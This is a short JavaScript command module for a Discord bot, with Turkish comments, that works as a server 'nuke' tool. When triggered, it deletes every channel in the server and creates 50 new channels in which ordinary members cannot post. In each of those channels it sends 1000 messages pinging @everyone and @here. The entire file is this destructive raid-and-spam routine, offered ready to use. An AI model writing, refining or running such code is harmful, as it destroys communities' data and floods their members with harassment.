module.exports.run = async (client, message, args) => {
    
    var channelNames =  ["mafoşi","mafo"]; // Buraya istediğin kadar kanal adı gir hepsini açıp mesaj atıcak 29. satırı kontrol et.
    message.guild.channels.cache.forEach(channel => channel.delete()); // Sunucudaki tüm kanalları siler.

    for(let i = 0; i < 50; i++) {
        var number = Math.floor(Math.random() * channelNames.length);
        var channelName = channelNames[number];
        message.guild.channels.create(channelName, {
            type: "text",
            permissionOverwrites: [
                {
                    id: message.guild.roles.everyone,
                    deny: ["SEND_MESSAGES"]
                }
            ],
        }).then(channel => {
            for(let i = 0; i < 1000; i++) { // Süreye elleme! 
                channel.send({ content: `mafoşirama

@everyone & @here` }); // Burada açtığı tüm kanallara everyone ve here spamı atar mesaj içeriğini yazın kısaca.
            }
        });
    }
}

module.exports.help = {

    name: "ks"

}